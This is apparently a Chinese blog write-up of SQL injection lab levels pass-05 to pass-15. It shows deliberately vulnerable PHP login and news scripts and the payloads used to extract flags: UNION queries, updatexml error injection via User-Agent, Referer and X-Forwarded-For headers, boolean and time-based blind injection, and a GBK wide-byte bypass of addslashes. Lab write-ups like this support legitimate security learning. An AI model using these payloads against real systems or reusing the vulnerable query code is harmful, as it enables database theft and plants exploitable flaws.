<h1 id="pass-05"><a href="#pass-05" class="headerlink" title="pass-05"></a>pass-05</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">$username = $_POST[<span class="string">'username'</span>];</span><br><span class="line">$password = $_POST[<span class="string">'password'</span>];</span><br><span class="line">$sql = <span class="string">'select *from user where username =\''</span>.$username.<span class="string">'\' and password=\''</span>.$password.<span class="string">'\''</span>;</span><br><span class="line">mysqli_select_db($conn,<span class="string">'******'</span>); <span class="comment">//不想告诉你们库名</span></span><br><span class="line">$result = mysqli_query($conn,$sql);</span><br><span class="line">$row = mysqli_fetch_array($result);</span><br><span class="line">$uname = $row[<span class="string">'username'</span>];</span><br><span class="line">$passwd = $row[<span class="string">'password'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($row)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'成功登录Your Login name:'</span>.$uname.<span class="string">'Your Password:'</span>.$passwd.<span class="string">''</span>;&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;<span class="keyword">echo</span> <span class="string">'账号密码错误'</span>;&#125;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<ul>
<li><strong>先用万能密码登陆，获取账号和密码，然后再post注入，利用联合查询生成其他的账号和密码使回显成功，最后用limit 1,1 显示第二行也就是我们联合查询加入进去的账号和密码，然后再注入和上面四题没区别</strong></li>
</ul>
</blockquote>
<ul>
<li>万能密码登陆</li>
</ul>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210725141449607.png" alt="image-20210725141449607"></p>
<blockquote>
<ul>
<li><strong>用Hackbard的post注入，找到回显点</strong></li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line">username=admin&amp;password=as4dsa2dsad2a3'  union all <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="keyword">limit</span> <span class="number">1</span>,<span class="number">1</span><span class="comment">#</span></span><br></pre></td></tr></table></figure></div>

<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210725141606362.png" alt="image-20210725141606362"></p>
<blockquote>
<ul>
<li>表</li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line">username=admin&amp;password=as4dsa2dsad2a3'  union all <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">1</span>,<span class="number">1</span><span class="comment">#</span></span><br></pre></td></tr></table></figure></div>

<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210725141943040.png" alt="image-20210725141943040"></p>
<blockquote>
<ul>
<li><strong>字段</strong></li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line">username=admin&amp;password=as4dsa2dsad2a3'  union all <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">and</span> table_name=<span class="string">'flag'</span> <span class="keyword">limit</span> <span class="number">1</span>,<span class="number">1</span><span class="comment">#</span></span><br></pre></td></tr></table></figure></div>

<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210725142047502.png" alt="image-20210725142047502"></p>
<blockquote>
<ul>
<li>拿flag</li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">username&#x3D;admin&amp;password&#x3D;as4dsa2dsad2a3&#39;  union all select 1,2,flag from flag limit 1,1#</span><br></pre></td></tr></table></figure></div>

<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210725142133255.png" alt="image-20210725142133255"></p>
<h1 id="pass-06"><a href="#pass-06" class="headerlink" title="pass-06"></a>pass-06</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">$username = $_POST[<span class="string">'username'</span>];</span><br><span class="line">$password = $_POST[<span class="string">'password'</span>];</span><br><span class="line">$sql = <span class="string">'select *from user where username =("'</span>.$username.<span class="string">'") and password=("'</span>.$password.<span class="string">'")'</span>;</span><br><span class="line">mysqli_select_db($conn,<span class="string">'******'</span>); <span class="comment">//不想告诉你们库名</span></span><br><span class="line">$result = mysqli_query($conn,$sql);</span><br><span class="line">$row = mysqli_fetch_array($result);</span><br><span class="line">$uname = $row[<span class="string">'username'</span>];</span><br><span class="line">$passwd = $row[<span class="string">'password'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($row)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'成功登录Your Login name:'</span>.$uname.<span class="string">'Your Password:'</span>.$passwd.<span class="string">''</span>;&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;<span class="keyword">echo</span> <span class="string">'账号密码错误'</span>;&#125;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<ul>
<li>双引号后面加个括号</li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line">username=admin&amp;password=as4dsa2dsad2a3")  union all <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,flag <span class="keyword">from</span> flag <span class="keyword">limit</span> <span class="number">1</span>,<span class="number">1</span><span class="comment">#</span></span><br></pre></td></tr></table></figure></div>

<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210725142450880.png" alt="image-20210725142450880"></p>
<h1 id="pass-07"><a href="#pass-07" class="headerlink" title="pass-07"></a>pass-07</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">$username = $_POST[<span class="string">'username'</span>];</span><br><span class="line">$password = $_POST[<span class="string">'password'</span>];</span><br><span class="line">$uagent = $_SERVER[<span class="string">'HTTP_USER_AGENT'</span>];</span><br><span class="line">$jc = $username.$password;</span><br><span class="line">$sql = <span class="string">'select *from user where username =\''</span>.$username.<span class="string">'\' and password=\''</span>.$password.<span class="string">'\''</span>;</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/.*\'.*/'</span>,$jc)!== <span class="number">0</span>)&#123;<span class="keyword">die</span>(<span class="string">'为了网站安全性，禁止输入某些特定符号'</span>);&#125;</span><br><span class="line">mysqli_select_db($conn,<span class="string">'****'</span>);<span class="comment">//不想告诉你库名</span></span><br><span class="line">$result = mysqli_query($conn,$sql);</span><br><span class="line">$row = mysqli_fetch_array($result);</span><br><span class="line">$uname = $row[<span class="string">'username'</span>];</span><br><span class="line">$passwd = $row[<span class="string">'password'</span>];</span><br><span class="line"><span class="keyword">if</span>($row)&#123;</span><br><span class="line">$Insql = <span class="string">"INSERT INTO uagent (`uagent`,`username`) VALUES ('$uagent','$uname')"</span>;</span><br><span class="line">$result1 = mysqli_query($conn,$Insql);</span><br><span class="line">print_r(mysqli_error($conn));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'成功登录'</span>;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<ul>
<li><strong>过滤了单引号，万能密码登陆没用了，看到user_agent的head头中被安插在插入语句中，可以直接sqlmap跑*加包，或者第二种方法用burp跑出密码登陆，再UA中填updatexml来报错直接页面上显示uA中语句错误，第一种方法无脑，就不做了</strong></li>
</ul>
</blockquote>
<blockquote>
<ul>
<li><strong>账号和密码是admin和123456，看源码得知，必须登陆才能执行user-agent下面的语句，$row必须不为空，所以想要报错注入，就必须能登陆成功</strong></li>
</ul>
</blockquote>
<ul>
<li><strong>登陆成功抓个包</strong></li>
</ul>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210725150453588.png" alt="image-20210725150453588"></p>
<blockquote>
<ul>
<li>拼接一个完整的insert 并且在其中写一个updatexml报错注入</li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line">'or updatexml(1,concat(0x7e,user()),1),1)<span class="comment">#</span></span><br></pre></td></tr></table></figure></div>

<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210725152021021.png" alt="image-20210725152021021"></p>
<blockquote>
<ul>
<li>取表</li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line">'or updatexml(1,concat(0x7e,(<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>)),<span class="number">1</span>),<span class="number">1</span>)<span class="comment">#</span></span><br></pre></td></tr></table></figure></div>

<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210725152142821.png" alt="image-20210725152142821"></p>
<blockquote>
<ul>
<li>取字段和flag</li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line">'or updatexml(1,concat(0x7e,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">and</span> table_name=<span class="string">'flag_head'</span>)),<span class="number">1</span>),<span class="number">1</span>)<span class="comment">#</span></span><br></pre></td></tr></table></figure></div>

<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210725152328201.png" alt="image-20210725152328201"></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">&#39;or updatexml(1,concat(0x7e,(select group_concat(flag_h1) from flag_head)),1),1)#</span><br></pre></td></tr></table></figure></div>

<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210725152450350.png" alt="image-20210725152450350"></p>
<h1 id="pass-08"><a href="#pass-08" class="headerlink" title="pass-08"></a>pass-08</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">$username = $_POST[<span class="string">'username'</span>];</span><br><span class="line">$password = $_POST[<span class="string">'password'</span>];</span><br><span class="line">$uagent = $_SERVER[<span class="string">'HTTP_REFERER'</span>];</span><br><span class="line">$jc = $username.$password;</span><br><span class="line">$sql = <span class="string">'select *from user where username =\''</span>.$username.<span class="string">'\' and password=\''</span>.$password.<span class="string">'\''</span>;</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/.*\'.*/'</span>,$jc)!== <span class="number">0</span>)&#123;<span class="keyword">die</span>(<span class="string">'为了网站安全性，禁止输入某些特定符号'</span>);&#125;</span><br><span class="line">mysqli_select_db($conn,<span class="string">'****'</span>);<span class="comment">//不想告诉你库名</span></span><br><span class="line">$result = mysqli_query($conn,$sql);</span><br><span class="line">$row = mysqli_fetch_array($result);</span><br><span class="line">$uname = $row[<span class="string">'username'</span>];</span><br><span class="line">$passwd = $row[<span class="string">'password'</span>];</span><br><span class="line"><span class="keyword">if</span>($row)&#123;</span><br><span class="line">$Insql = <span class="string">"INSERT INTO refer (`refer`,`username`) VALUES ('$uagent','$uname')"</span>;</span><br><span class="line">$result1 = mysqli_query($conn,$Insql);</span><br><span class="line">print_r(mysqli_error($conn));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'成功登录'</span>;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<ul>
<li><strong>就是head头中user-agent的插入换成了refer</strong></li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line">Referer: 'or updatexml(1,concat(0x7e,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(flag_h1) <span class="keyword">from</span> flag_head)),<span class="number">1</span>),<span class="number">1</span>)<span class="comment">#</span></span><br></pre></td></tr></table></figure></div>

<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210725153252352.png" alt="image-20210725153252352"></p>
<h1 id="pass-09"><a href="#pass-09" class="headerlink" title="pass-09"></a>pass-09</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getip</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (getenv(<span class="string">'HTTP_CLIENT_IP'</span>))</span><br><span class="line">	&#123;</span><br><span class="line">		$ip = getenv(<span class="string">'HTTP_CLIENT_IP'</span>); </span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">elseif</span> (getenv(<span class="string">'HTTP_X_FORWARDED_FOR'</span>)) </span><br><span class="line">	&#123; </span><br><span class="line">		$ip = getenv(<span class="string">'HTTP_X_FORWARDED_FOR'</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">elseif</span> (getenv(<span class="string">'HTTP_X_FORWARDED'</span>)) </span><br><span class="line">	&#123; </span><br><span class="line">		$ip = getenv(<span class="string">'HTTP_X_FORWARDED'</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">elseif</span> (getenv(<span class="string">'HTTP_FORWARDED_FOR'</span>))</span><br><span class="line">	&#123;</span><br><span class="line">		$ip = getenv(<span class="string">'HTTP_FORWARDED_FOR'</span>); </span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">elseif</span> (getenv(<span class="string">'HTTP_FORWARDED'</span>))</span><br><span class="line">	&#123;</span><br><span class="line">		$ip = getenv(<span class="string">'HTTP_FORWARDED'</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123; </span><br><span class="line">		$ip = $_SERVER[<span class="string">'REMOTE_ADDR'</span>];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> $ip;</span><br><span class="line">&#125;</span><br><span class="line">$username = $_POST[<span class="string">'username'</span>];</span><br><span class="line">$password = $_POST[<span class="string">'password'</span>];</span><br><span class="line">$ip = getip();</span><br><span class="line">$jc = $username.$password;</span><br><span class="line">$sql = <span class="string">'select *from user where username =\''</span>.$username.<span class="string">'\' and password=\''</span>.$password.<span class="string">'\''</span>;</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/.*\'.*/'</span>,$jc)!== <span class="number">0</span>)&#123;<span class="keyword">die</span>(<span class="string">'为了网站安全性，禁止输入某些特定符号'</span>);&#125;</span><br><span class="line">mysqli_select_db($conn,<span class="string">'****'</span>);<span class="comment">//不想告诉你库名</span></span><br><span class="line">$result = mysqli_query($conn,$sql);</span><br><span class="line">$row = mysqli_fetch_array($result);</span><br><span class="line">$uname = $row[<span class="string">'username'</span>];</span><br><span class="line">$passwd = $row[<span class="string">'password'</span>];</span><br><span class="line"><span class="keyword">if</span>($row)&#123;</span><br><span class="line">$Insql = <span class="string">"INSERT INTO ip (`ip`,`username`) VALUES ('$ip','$uname')"</span>;</span><br><span class="line">$result1 = mysqli_query($conn,$Insql);</span><br><span class="line">print_r(mysqli_error($conn));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'成功登录'</span>;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<ul>
<li><strong>head头中记录我们访问ip的是X-FORWARDED-FOR，因为head头中有时是不显示的，我们自己加一个</strong></li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line">X-FORWARDED-FOR: 'or updatexml(1,concat(0x7e,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(flag_h1) <span class="keyword">from</span> flag_head)),<span class="number">1</span>),<span class="number">1</span>)<span class="comment">#</span></span><br></pre></td></tr></table></figure></div>

<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210725153701899.png" alt="image-20210725153701899"></p>
<h1 id="pass-10"><a href="#pass-10" class="headerlink" title="pass-10"></a>pass-10</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">$news =<span class="string">''</span>;</span><br><span class="line">@$id = $_GET[<span class="string">'id'</span>];</span><br><span class="line">@$sql = <span class="string">'select *from news where id='</span>.$id;</span><br><span class="line">mysqli_select_db($conn,<span class="string">'****'</span>);<span class="comment">// 不想让你们知道库名</span></span><br><span class="line">$result = mysqli_query($conn,$sql);</span><br><span class="line"><span class="keyword">while</span> ($row = mysqli_fetch_array($result))&#123;  </span><br><span class="line">$news = $row[<span class="string">'news'</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($news!== <span class="string">''</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'有数据'</span>;&#125;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<ul>
<li><p><strong>length函数：</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">length(字符串内容)</span><br></pre></td></tr></table></figure></div>

<p>这个函数主要是用来测试字符串长度用，在盲注中是用来判断当前查询的字符串长度，例如数据库名，表名的长度。</p>
<p><strong>substr函数：</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">SUBSTR(字符串内容,从哪截取,截取多长)</span><br></pre></td></tr></table></figure></div>

<p>用于分割字符串，将字符串分割成单个，配合ASCII码测试单个字符到底是什么字符。</p>
<p><strong>ascii函数：</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">ascii(填入字符)</span><br></pre></td></tr></table></figure></div>

<p>返回字符的ascii码，将字符转变为数字，将字符都转变为数字，可利用数字大小趋向的特性进行大小比较，从而迅速判断出准确的字符内容。</p>
</li>
</ul>
</blockquote>
<ul>
<li><strong>先用length判断数据库名</strong></li>
</ul>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210725154941303.png" alt="image-20210725154941303"></p>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210725154916227.png" alt="image-20210725154916227"></p>
<blockquote>
<ul>
<li>再用substr从第一个字符的ascii码开始判断他为什么</li>
</ul>
</blockquote>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210725155127027.png" alt="image-20210725155127027"></p>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210725155232219.png" alt="image-20210725155232219"></p>
<blockquote>
<ul>
<li>我拿起手中的burp来跑起，12字符快</li>
</ul>
</blockquote>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210725155429654.png" alt="image-20210725155429654"></p>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210725155447310.png" alt="image-20210725155447310"></p>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210725155619456.png" alt="image-20210725155619456"></p>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210725160053468.png" alt="image-20210725160053468"></p>
<blockquote>
<ul>
<li>按从1到12的顺序把ascii码写下来准备解码</li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">107 97 110 119 111 108 111 110 103 120 105 97</span><br></pre></td></tr></table></figure></div>

<blockquote>
<ul>
<li>了解原理就好了，菜B的我还是sqlmap好用，暂时python脚本还不太会写</li>
</ul>
</blockquote>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210725161831345.png" alt="image-20210725161831345"></p>
<h1 id="pass-11"><a href="#pass-11" class="headerlink" title="pass-11"></a>pass-11</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">$news =<span class="string">''</span>;</span><br><span class="line">@$id = $_GET[<span class="string">'id'</span>];</span><br><span class="line">@$sql = <span class="string">'select *from news where id="'</span>.$id.<span class="string">'"'</span>;</span><br><span class="line">mysqli_select_db($conn,<span class="string">'****'</span>);<span class="comment">// 不想让你们知道库名</span></span><br><span class="line">$result = mysqli_query($conn,$sql);</span><br><span class="line"><span class="keyword">while</span> ($row = mysqli_fetch_array($result))&#123;  </span><br><span class="line">$news = $row[<span class="string">'news'</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($news!== <span class="string">''</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'有数据'</span>;&#125;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<ul>
<li><strong>原理和上题一模一样就是需要加个单引号和末尾加个注释符%23也就是#</strong></li>
</ul>
</blockquote>
<h1 id="pass-12"><a href="#pass-12" class="headerlink" title="pass-12"></a>pass-12</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">$username = $_POST[<span class="string">'username'</span>];</span><br><span class="line">$password = $_POST[<span class="string">'password'</span>];</span><br><span class="line">$sql = <span class="string">'select *from user where username =\''</span>.$username.<span class="string">'\' and password=\''</span>.$password.<span class="string">'\''</span>;</span><br><span class="line">mysqli_select_db($conn,<span class="string">'******'</span>); <span class="comment">//不想告诉你们库名</span></span><br><span class="line">$result = mysqli_query($conn,$sql);</span><br><span class="line">$row = mysqli_fetch_array($result);</span><br><span class="line">$uname = $row[<span class="string">'username'</span>];</span><br><span class="line">$passwd = $row[<span class="string">'password'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($row)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'成功登录'</span>;&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;<span class="keyword">echo</span> <span class="string">'账号密码错误'</span>;&#125;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<ul>
<li>换了个传参方式，但是原理不变</li>
</ul>
</blockquote>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210725162937391.png" alt="image-20210725162937391"></p>
<h1 id="pass-13"><a href="#pass-13" class="headerlink" title="pass-13"></a>pass-13</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">$news =<span class="string">''</span>;</span><br><span class="line">@$id = $_GET[<span class="string">'id'</span>];</span><br><span class="line">@$sql = <span class="string">'select *from news where id="'</span>.$id.<span class="string">'"'</span>;</span><br><span class="line">mysqli_select_db($conn,<span class="string">'****'</span>);<span class="comment">// 不想让你们知道库名</span></span><br><span class="line">$result = mysqli_query($conn,$sql);</span><br><span class="line"><span class="keyword">while</span> ($row = mysqli_fetch_array($result))&#123;  </span><br><span class="line">$news = $row[<span class="string">'news'</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'有数据'</span>;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<ul>
<li>时间盲注的判断方式也是布尔盲注的一种</li>
</ul>
</blockquote>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210725163438518.png" alt="image-20210725163438518"></p>
<blockquote>
<ul>
<li><p>(1)、if(条件，满足条件的返回，不满足田间的返回)</p>
<p>(2)、sleep(X)：休眠X秒</p>
</li>
</ul>
</blockquote>
<ul>
<li>判断数据库的长度</li>
</ul>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210725170042202.png" alt="image-20210725170042202"></p>
<ul>
<li>判断数据库的值用substr和ascii</li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">1&quot; and if(ascii(substr(database(),1,1))&gt;1,sleep(1),1)%23</span><br></pre></td></tr></table></figure></div>

<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210725170337323.png" alt="image-20210725170337323"></p>
<ul>
<li>抓包，然后和布尔盲注是一样的操作，理解原理就行</li>
</ul>
<h1 id="pass-14"><a href="#pass-14" class="headerlink" title="pass-14"></a>pass-14</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">$news =<span class="string">''</span>;</span><br><span class="line">@$id = $_GET[<span class="string">'id'</span>];</span><br><span class="line">@$sql = <span class="string">'select *from news where id=(\''</span>.$id.<span class="string">'\')'</span>;</span><br><span class="line">mysqli_select_db($conn,<span class="string">'****'</span>);<span class="comment">// 不想让你们知道库名</span></span><br><span class="line">$result = mysqli_query($conn,$sql);</span><br><span class="line"><span class="keyword">while</span> ($row = mysqli_fetch_array($result))&#123;  </span><br><span class="line">$news = $row[<span class="string">'news'</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'有数据'</span>;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<ul>
<li>和上题一模一样，除了”双引号换成’)</li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;inject2.lab.aqlab.cn:81&#x2F;Pass-14&#x2F;index.php?id&#x3D;1&#39;) and if(ascii(substr(database(),1,1))&gt;1,sleep(5),1)%23</span><br></pre></td></tr></table></figure></div>

<h1 id="pass-15"><a href="#pass-15" class="headerlink" title="pass-15"></a>pass-15</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">$username = <span class="string">''</span>;</span><br><span class="line">$password = <span class="string">''</span>;</span><br><span class="line">@$id = addslashes($_GET[<span class="string">'id'</span>]);</span><br><span class="line">@$sql = <span class="string">'select *from user where id=\''</span>.$id.<span class="string">'\''</span>;</span><br><span class="line">mysqli_select_db($conn,<span class="string">'****'</span>);<span class="comment">// 不想让你们知道库名</span></span><br><span class="line">mysqli_query($conn,<span class="string">"SET NAMES gbk"</span>);</span><br><span class="line">$result = mysqli_query($conn,$sql);</span><br><span class="line"><span class="keyword">while</span> ($row = mysqli_fetch_array($result))&#123;  </span><br><span class="line">$username = $row[<span class="string">'username'</span>];</span><br><span class="line">$password = $row[<span class="string">'password'</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'Your Login name:'</span>.$username;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'Your Password:'</span>.$password;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<ul>
<li><strong>可以发现有addslashes函数导致我们输入的一些单双引号前面加了个右斜线\，由于右斜线的url编码是%5c，%df%5c会组成一个特殊汉字来进行逃逸，</strong></li>
<li><strong>因为GBK编码默认两个字符为一个汉字, 我们可以通过输入宽字符%df使反斜杠和这个%df形成一个汉字,这样后面的单引号就不会被转义而达到逃逸的效果</strong></li>
</ul>
</blockquote>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210725171608951.png" alt="image-20210725171608951"></p>
<ul>
<li>输入<strong>%df</strong>逃逸斜线</li>
</ul>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210725171819994.png" alt="image-20210725171818342"></p>
<ul>
<li><strong>接着判断字段长度、等拿flag和第一题一样</strong></li>
</ul>
